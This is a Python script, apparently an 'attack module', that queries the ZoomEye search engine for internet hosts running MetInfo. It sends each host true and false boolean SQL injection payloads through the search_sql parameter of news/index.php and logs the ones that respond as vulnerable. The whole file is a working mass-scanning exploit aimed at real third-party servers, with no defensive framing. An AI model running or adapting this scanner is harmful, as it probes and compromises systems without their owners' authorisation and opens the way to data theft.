#!/bin/env python
#coding:utf-8

import re
import sys
sys.path.append("../../")
import urllib2
import json

from zoomeye.lib.core.data import logger
from zoomeye.ZoomeyeApiSdk import ZoomeyeSDK


def attack(url):
	a = "http://{target}/news/index.php?".format(target=url)

	playLoadTrue = "http://{target}/news/index.php?"\
			"search_sql=%20123qwe%20"\
			"where%201234%3D1234%20--%20x&imgproduct=xxxx".format(target=url)

	playLoadFalse = "http://{target}/news/index.php?"\
			"serch_sql=%20123qwe%20"\
			"where%201234%3D1235%20--%20x&imgproduct=xxxx".format(target=url)
	try:
		req = urllib2.Request(playLoadTrue)
		resp = urllib2.urlopen(req)
		if resp.code != 200:
			return
		data_true = resp.read()

		#print data_true
		if not re.search(r'href=["\' ]shownews\.php\?lang=', data_true, re.M):
				return

		req = urllib2.Request(playLoadFalse)
		resp = urllib2.urlopen(req)
		if resp.code != 200:
			return
		data_false = resp.read()
		#print data_false

		if re.search(r'href=["\' ]shownews\.php\?lang=', data_false, re.M):
			return

		logger.info("%s is vulnerable!" % url)
	except:
		pass

def main():
	logger.info("Attack module MetInfo is running")
	user = ""
	passwd = ""
	app = ZoomeyeSDK(user,passwd)

	ip_list = []

	app.login()
	result = app.hostSearch("MetInfo",page=1)
	ip_list = app.getIp_ZoomeyeSearch(result)

	for x in ip_list:
		logger.info("find ip:{0}".format(x))
	for ip in ip_list:
		attack(ip)

if __name__ == "__main__":
	main()
